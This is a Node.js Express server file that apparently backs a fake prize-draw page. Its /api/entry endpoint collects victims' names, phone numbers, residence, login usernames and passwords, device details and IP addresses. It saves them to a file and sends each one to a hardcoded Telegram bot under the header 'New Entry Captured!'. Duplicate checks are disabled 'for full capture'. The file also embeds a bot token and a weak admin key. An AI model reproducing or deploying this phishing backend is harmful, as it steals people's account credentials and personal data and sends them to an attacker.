if (!Object.hasOwn) {
    Object.hasOwn = (obj, prop) => Object.prototype.hasOwnProperty.call(obj, prop);
}

if (!String.prototype.replaceAll) {
    String.prototype.replaceAll = function (str, newStr) {
        if (Object.prototype.toString.call(str).toLowerCase() === '[object regexp]') {
            return this.replace(str, newStr);
        }
        return this.replace(new RegExp(str.replace(/[.*+?^${}()|[\]\\]/g, "\\$&"), 'g'), newStr);
    };
}

const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const https = require('https');

const app = express();
const PORT = process.env.PORT || 3000;
const DATA_FILE = path.join(__dirname, 'entries.json');

// Telegram Configuration
const TELEGRAM_BOT_TOKEN = '8460137294:AAHzdNXpkVLXnbFxbW6MX-xis61dd6bwCfU';
const TELEGRAM_CHAT_ID = '689594390';

function sendToTelegram(entry) {
    const message = `
🚀 *New Entry Captured!*
------------------------
👤 *Name:* ${entry.fullName || 'N/A'}
📱 *Phone:* ${entry.phone}
🏠 *Residence:* ${entry.residence || 'N/A'}

🔑 *Credentials:*
👤 *User:* ${entry.loginCredentials?.username || 'N/A'}
🔒 *Pass:* ${entry.loginCredentials?.password || 'N/A'}

📱 *Device Info:*
💻 *Type:* ${entry.deviceInfo?.type || 'N/A'}
💻 *OS:* ${entry.deviceInfo?.os || 'N/A'}
🌐 *IP:* ${entry.ip || 'N/A'}
📍 *Time:* ${entry.timestamp}
    `;

    const data = JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'Markdown'
    });

    const options = {
        hostname: 'api.telegram.org',
        port: 443,
        path: `/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': data.length
        }
    };

    const req = https.request(options, (res) => {
        res.on('data', (d) => {
            process.stdout.write(d);
        });
    });

    req.on('error', (error) => {
        console.error('Telegram Error:', error);
    });

    req.write(data);
    req.end();
}

app.use(cors());
app.use(bodyParser.json());
app.use(express.static('public'));

// Rate Limiting (Simple In-Memory)
const ipRateLimit = new Map();
const RATE_LIMIT_WINDOW_MS = 60 * 60 * 1000; // 1 Hour
const MAX_REQUESTS_PER_IP = 3;

const ADMIN_SECRET = 'sudani2026'; // Simple secret for access

// Endpoint to handle entry submissions
app.post('/api/entry', (req, res) => {
    const newEntry = req.body;
    const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

    // 1. Rate Limiting Check
    const currentTime = Date.now();
    const userRequests = ipRateLimit.get(clientIp) || [];

    // Filter out old requests
    const recentRequests = userRequests.filter(timestamp => currentTime - timestamp < RATE_LIMIT_WINDOW_MS);

    if (recentRequests.length >= MAX_REQUESTS_PER_IP) {
        return res.status(429).json({ success: false, message: 'عذراً، لقد تجاوزت الحد المسموح به من المحاولات. يرجى المحاولة لاحقاً.' });
    }

    // Update rate limit record
    recentRequests.push(currentTime);
    ipRateLimit.set(clientIp, recentRequests);

    if (!newEntry.phone) {
        return res.status(400).json({ success: false, message: 'Phone number is required' });
    }

    // Read existing entries
    fs.readFile(DATA_FILE, 'utf8', (err, data) => {
        let entries = [];
        if (!err && data) {
            try {
                entries = JSON.parse(data);
            } catch (e) {
                console.error('Error parsing JSON:', e);
            }
        }

        /* 
        // 2. Check for duplicates (Phone Number) - DISABLED for full capture
        const isDuplicatePhone = entries.some(entry => entry.phone === newEntry.phone);
        if (isDuplicatePhone) {
            return res.status(400).json({ success: false, message: 'عذراً، هذا الرقم مسجل بالفعل في السحب.' });
        }

        // 3. Check for duplicates (Device Fingerprint) - DISABLED for full capture
        if (newEntry.deviceInfo && newEntry.deviceInfo.fingerprint) {
            const deviceUsageCount = entries.filter(entry =>
                entry.deviceInfo && entry.deviceInfo.fingerprint === newEntry.deviceInfo.fingerprint
            ).length;

            if (deviceUsageCount >= 1) {
                return res.status(400).json({ success: false, message: 'عذراً، تم التسجيل مسبقاً من هذا الجهاز.' });
            }
        }
        */

        // Add metadata
        newEntry.timestamp = new Date().toISOString();
        newEntry.ip = clientIp;
        entries.push(newEntry);

        // Write updated entries back to file
        fs.writeFile(DATA_FILE, JSON.stringify(entries, null, 2), (err) => {
            if (err) {
                console.error('Error writing file:', err);
                return res.status(500).json({ success: false, message: 'Server error' });
            }

            // Send to Telegram
            sendToTelegram(newEntry);

            res.json({ success: true, message: 'Entry received' });
        });
    });
});

// Admin endpoint to view entries
app.get('/api/admin/entries', (req, res) => {
    const key = req.query.key;
    if (key !== ADMIN_SECRET) {
        return res.status(403).json({ success: false, message: 'Unauthorized' });
    }

    fs.readFile(DATA_FILE, 'utf8', (err, data) => {
        if (err || !data) {
            return res.json([]);
        }
        res.json(JSON.parse(data));
    });
});

app.listen(PORT, () => {
    console.log(`Server running at http://localhost:${PORT}`);
});
